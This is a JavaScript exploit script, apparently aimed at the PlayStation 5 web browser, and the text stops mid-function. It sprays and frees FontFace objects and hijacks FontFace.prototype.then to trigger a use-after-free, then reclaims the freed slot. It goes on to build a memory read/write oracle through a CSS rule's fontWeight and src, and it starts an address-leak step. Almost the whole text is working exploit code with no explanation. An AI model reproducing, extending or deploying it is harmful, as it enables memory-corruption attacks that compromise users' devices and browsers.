const O=document.getElementById("out");
const bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){const e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=C.scrollHeight;
try{console.log("[v21] "+m)}catch(e){}}
function Ok(m){P("  вң… "+m,"ok")}function Fl(m){P("  вңҳ "+m,"er")}
function Wr(m){P("  вҡ  "+m,"wr")}function Hi(m){P("  в–ә "+m,"hl")}
function St(m){P("  вҳ… "+m,"mg")}function Dm(m){P("  "+m,"dm")}

window.onerror=function(m,s,l){Fl("FATAL: "+m+" @"+l);return true};

let keep=[],holes=[],rcs=[];
let trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
let xRuleIdx=-1,xRule=null;

const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// Holes
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();

// Trigger
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
var sh=document.getElementById("s").sheet;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();

// UAF
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","UAF:<b>вң…</b>");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);rcs.push(f)}catch(e){}}
fs();try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// Capture
document.fonts.load("1em trigger, x","AB").then(function(faces){
for(var i=0;i<faces.length;i++){
var f=faces[i];
if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
}
keep.push(faces);keep.push(rcFace);
if(!rcFace){Fl("No RC");return}
Ok("RC_"+rcIdx);
hu("h3","RC:<b>"+rcIdx+"</b>");
var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

// Add CSS rule for "x" вҖ” controls confused slot
xRuleIdx=sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
sh.cssRules.length);
fs();
xRule=sh.cssRules[xRuleIdx];
Ok("CSS rule for 'x' added at index "+xRuleIdx);

// ============================================================
//  TEST 1: Deep read of load() result for "x" face
// ============================================================
pg(30);P("\nв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
P("  TEST 1: Deep load() Analysis","hd");
P("в•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");

function deepRead(face,label){
  P("  "+label+":");
  var props=["family","style","weight","stretch","unicodeRange",
  "variant","featureSettings","display","status"];
  for(var i=0;i<props.length;i++){
    try{
      var v=face[props[i]];
      var t=typeof v;
      if(v===undefined)P("    "+props[i].padEnd(16)+"= undefined","wr");
      else if(v===null)P("    "+props[i].padEnd(16)+"= null","wr");
      else P("    "+props[i].padEnd(16)+"= "+v+" ("+t+")",
        t==="number"&&v>0x1000?"hl":"ok");
    }catch(e){
      P("    "+props[i].padEnd(16)+"= ERR: "+e.message.substring(0,30),"er");
    }
  }
  // Try toString
  try{P("    toString:       = "+String(face).substring(0,60))}catch(e){}
  // Try Object.keys
  try{var k=Object.keys(face);P("    keys:           = ["+k.join(",")+"]")}catch(e){}
  // Try for-in
  try{var fi=[];for(var p in face)fi.push(p);
  if(fi.length>0)P("    for-in:         = ["+fi.slice(0,10).join(",")+"]")}catch(e){}
}

document.fonts.load("1em trigger, x","AB").then(function(f2){
  P("  load() returned "+f2.length+" faces");
  for(var i=0;i<f2.length;i++){
    deepRead(f2[i],"Face["+i+"]");
  }
  
  // Keep reference to "x" face
  var xFace=null;
  for(var i=0;i<f2.length;i++){
    try{if(f2[i].family==="x")xFace=f2[i]}catch(e){}
  }
  if(!xFace){
    // Try finding by checking each face
    for(var i=0;i<f2.length;i++){
      try{
        // Face might have undefined family but still be the "x" face
        if(f2[i]!==rcFace&&f2[i].family!=="trigger")xFace=f2[i];
      }catch(e){}
    }
  }
  keep.push(xFace);
  keep.push(f2);

  // ============================================================
  //  TEST 2: CSSRule fontWeight вҶ’ load() weight
  // ============================================================
  pg(45);P("\nв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
  P("  TEST 2: CSSRule fontWeight Oracle","hd");
  P("в•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
  
  var weights=["100","200","300","400","500","600","700","800","900"];
  var oracleLog=[];
  
  function testWeight(w,callback){
    try{
      xRule.style.fontWeight=w;
      fs();
    }catch(e){Fl("CSSRule write: "+e.message);callback(null);return}
    
    document.fonts.load("1em trigger, x","AB").then(function(f3){
      var result=null;
      for(var i=0;i<f3.length;i++){
        try{
          if(f3[i].family==="x"||
             (f3[i]!==rcFace&&f3[i].family!=="trigger")){
            result={weight:f3[i].weight,style:f3[i].style,
                    family:f3[i].family,status:f3[i].status};
            break;
          }
        }catch(e){}
      }
      callback(result);
    }).catch(function(e){callback(null)});
  }
  
  // Test each weight sequentially
  var wi=0;
  function nextWeight(){
    if(wi>=weights.length){
      // Summary
      var matches=oracleLog.filter(function(r){return r.match});
      P("\n  Oracle accuracy: "+matches.length+"/"+weights.length,
        matches.length>=3?"hl":"wr");
      if(matches.length>=3)St("fontWeight ORACLE WORKS!");
      
      // Move to next test
      test3();
      return;
    }
    var w=weights[wi];
    testWeight(w,function(r){
      var readWeight=r?r.weight:"null";
      var match=readWeight===w;
      oracleLog.push({write:w,read:readWeight,match:match});
      P("    Write "+w+" вҶ’ Read "+readWeight+(match?" вң…":" вқҢ"),
        match?"ok":"dm");
      wi++;
      nextWeight();
    });
  }
  nextWeight();

  // ============================================================
  //  TEST 3: CSSRule src manipulation
  // ============================================================
  function test3(){
    pg(60);P("\nв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
    P("  TEST 3: CSSRule src Manipulation","hd");
    P("в•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
    
    var srcTests=[
      {val:"local(Courier)",name:"Courier"},
      {val:"local(Helvetica)",name:"Helvetica"},
      {val:"local(Monaco)",name:"Monaco"},
      {val:"local(Geneva)",name:"Geneva"},
      {val:"local(Arial)",name:"Arial"},
      {val:"local(serif)",name:"serif"},
      {val:"local(monospace)",name:"monospace"}
    ];
    
    var si=0;
    function nextSrc(){
      if(si>=srcTests.length){test4();return}
      var t=srcTests[si];
      try{
        xRule.style.src=t.val;
        fs();
      }catch(e){Fl("src write: "+e.message);si++;nextSrc();return}
      
      document.fonts.load("1em trigger, x","AB").then(function(f4){
        var xF=null;
        for(var i=0;i<f4.length;i++){
          try{if(f4[i].family==="x"||(f4[i]!==rcFace&&f4[i].family!=="trigger"))
            {xF=f4[i];break}}catch(e){}
        }
        if(xF){
          P("    src="+t.name.padEnd(12)+" вҶ’ weight="+xF.weight+" style="+xF.style+
            " status="+xF.status,
            xF.status==="loaded"?"ok":"wr");
        }else{
          P("    src="+t.name.padEnd(12)+" вҶ’ no face found","wr");
        }
        si++;
        nextSrc();
      }).catch(function(e){P("    src="+t.name+" ERR","er");si++;nextSrc()});
    }
    nextSrc();
  }

  // ============================================================
  //  TEST 4: Data Encoding via CSSRule
  // ============================================================
  function test4(){
    pg(75);P("\nв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
    P("  TEST 4: Data Encoding Demo","hd");
    P("в•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
    
    // Encode byte 0xA5 = 10100101
    // Use fontWeight: 100=bit0, 200=bit0, 300=bit0, 400=bit1, ...
    // Actually: just use weight to encode 0-8 per nibble
    
    var testData=[0xA5,0x3F,0x00,0xFF];
    var decoded=[];
    
    var di=0;
    function nextByte(){
      if(di>=testData.length){showResults();return}
      var byte=testData[di];
      var hi=(byte>>4)&0xF; // high nibble
      var lo=byte&0xF;       // low nibble
      
      // Encode high nibble as fontWeight (100 + hi*100)
      var hiWeight=String(100+hi*100);
      try{xRule.style.fontWeight=hiWeight;fs()}catch(e){decoded.push(0);di++;nextByte();return}
      
      document.fonts.load("1em trigger, x","AB").then(function(f5){
        var xF=null;
        for(var i=0;i<f5.length;i++){
          try{if(f5[i].family==="x"||(f5[i]!==rcFace&&f5[i].family!=="trigger"))
            {xF=f5[i];break}}catch(e){}
        }
        
        var readHi=0;
        if(xF&&xF.weight){
          var w=parseInt(xF.weight);
          if(!isNaN(w))readHi=(w/100)|0;
          if(readHi>15)readHi=0;
        }
        
        // Encode low nibble
        var loWeight=String(100+lo*100);
        try{xRule.style.fontWeight=loWeight;fs()}catch(e){}
        
        document.fonts.load("1em trigger, x","AB").then(function(f6){
          var xF2=null;
          for(var i=0;i<f6.length;i++){
            try{if(f6[i].family==="x"||(f6[i]!==rcFace&&f6[i].family!=="trigger"))
              {xF2=f6[i];break}}catch(e){}
          }
          
          var readLo=0;
          if(xF2&&xF2.weight){
            var w2=parseInt(xF2.weight);
            if(!isNaN(w2))readLo=(w2/100)|0;
            if(readLo>15)readLo=0;
          }
          
          var decodedByte=(readHi<<4)|readLo;
          decoded.push(decodedByte);
          P("    Byte 0x"+byte.toString(16).toUpperCase().padStart(2,"0")+
            " вҶ’ hi="+readHi+" lo="+readLo+" вҶ’ 0x"+
            decodedByte.toString(16).toUpperCase().padStart(2,"0")+
            (decodedByte===byte?" вң…":" вқҢ"),
            decodedByte===byte?"ok":"er");
          
          di++;
          nextByte();
        });
      });
    }
    nextByte();
    
    function showResults(){
      P("\n  Sent:    "+testData.map(function(b){return "0x"+b.toString(16).toUpperCase().padStart(2,"0")}).join(" "));
      P("  Got:     "+decoded.map(function(b){return "0x"+b.toString(16).toUpperCase().padStart(2,"0")}).join(" "));
      var match=testData.every(function(b,i){return b===decoded[i]});
      P("  Match:   "+(match?"YES!":"NO"),match?"mg":"er");
      
      test5();
    }
  }

  // ============================================================
  //  TEST 5: Address Leak via CSSRule
  // ============================================================
  function test5(){
    pg(90);P("\nв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
    P("  TEST 5: Address Leak Attempt","hd");
    P("в•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җв•җ","hd");
    
    // Try setting src to a number via CSSRule
    // CSSRule.style.src might accept numbers like FontFace.src did
    var numSrcs=["0","1","42","1e308"];
    var ni=0;
    function nextNum(){
      if(ni>=numSrcs.length){summary();return}
      var n=numSrcs[ni];
      try{
        xRule.style.src=n;
        fs();
